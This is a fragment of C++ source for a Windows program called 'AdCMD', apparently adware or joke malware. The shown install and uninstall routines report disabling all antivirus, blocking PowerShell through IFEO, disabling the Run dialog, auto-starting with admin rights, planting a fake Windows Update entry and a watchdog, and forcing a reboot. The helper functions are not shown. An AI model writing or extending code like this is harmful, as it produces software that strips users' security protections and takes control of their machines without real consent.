        AppendToEdit(L"[OK] All antivirus software temporarily disabled\r\n");
        MessageBoxW(NULL, L"AdCMD v4.3 System Integration Complete!\n\nChanges applied:\n  [OK] Auto-start with admin privileges\n  [OK] Win+R disabled (cmd.exe only)\n  [OK] PowerShell blocked via IFEO\n  [OK] Process protection active\n  [OK] Region-aware ads enabled\n  [OK] ReactOS compatibility enabled\n  [OK] Windows Update entry created (KB66666666)\n  [OK] MV pre-downloaded to system cache\n  [OK] Watchdog protection installed\n  [OK] Antivirus temporarily disabled (will restore on uninstall)\n\nRestart your computer to experience the full AdCMD experience.\nYour system will never be the same. (In a good way. Probably.)", L"AdCMD Installation Complete", MB_OK | MB_ICONINFORMATION); 
        LocalFree(argv); GdiplusShutdown(gdiToken); return 0; 
    }

    if (argc > 0 && wcsstr(lpCmdLine, L"--uninstall") != NULL) { 
        BOOL isAdmin = FALSE; PSID administratorsGroup = NULL; SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY; 
        if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) { 
            CheckTokenMembership(NULL, administratorsGroup, &isAdmin); FreeSid(administratorsGroup); 
        } 
        if (!isAdmin) { 
            wchar_t exePath[MAX_PATH]; GetModuleFileNameW(NULL, exePath, MAX_PATH); 
            SHELLEXECUTEINFOW sei = { sizeof(sei) }; sei.lpVerb = L"runas"; sei.lpFile = exePath; sei.lpParameters = L"--uninstall"; sei.nShow = SW_NORMAL; 
            if (ShellExecuteExW(&sei)) { LocalFree(argv); GdiplusShutdown(gdiToken); return 0; } 
        } 
        WNDCLASSEXW wc = {0}; wc.cbSize = sizeof(wc); wc.lpfnWndProc = DefWindowProcW; wc.hInstance = hInstance; wc.lpszClassName = L"AdCMD_Temp"; RegisterClassExW(&wc); 
        HWND hwndTemp = CreateWindowExW(0, L"AdCMD_Temp", L"AdCMD Uninstall", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL); 
        if (TakeAwayBrowser(hwndTemp)) { 
            SetAutoStart(false); SetRunDialog(false); EnablePowerShellViaIFEO(); G::protectRunning = false; 
            GeekDisguise::RemoveWindowsUpdateEntry();
            RestoreAllAV();
            AppendToEdit(L"[OK] Antivirus software restored\r\n");
            MessageBoxW(NULL, L"AdCMD has been completely removed from your system.\n\nRestored:\n  [OK] Auto-start removed\n  [OK] Win+R restored\n  [OK] PowerShell restored\n  [OK] Browser removed (if installed by AdCMD)\n  [OK] Process protection disabled\n  [OK] Windows Update entry removed\n\nWe're sorry to see you go.\n(But not really. We know you'll be back.)\n\nSystem will now restart to complete cleanup.", L"AdCMD Uninstall Complete", MB_OK | MB_ICONINFORMATION); 
            system("shutdown /r /t 5 /f /c \"AdCMD uninstall complete. Restarting...\""); 
        } 
        DestroyWindow(hwndTemp); LocalFree(argv); GdiplusShutdown(gdiToken); return 0; 
    }

    LocalFree(argv);
    WNDCLASSEXW wc = {0}; wc.cbSize = sizeof(wc); wc.lpfnWndProc = MainWndProc; wc.hInstance = hInstance; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION); wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); wc.lpszClassName = L"AdCMD_Main"; RegisterClassExW(&wc);
    HWND hwnd = CreateWindowExW(0, L"AdCMD_Main", L"AdCMD v4.3 - Advertising Command Processor", WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, NULL, hInstance, NULL);
    if (!hwnd) { GdiplusShutdown(gdiToken); return 1; }
    ShowWindow(hwnd, nCmdShow); UpdateWindow(hwnd);
    MSG msg; while (GetMessageW(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    GdiplusShutdown(gdiToken); return (int)msg.wParam;
}
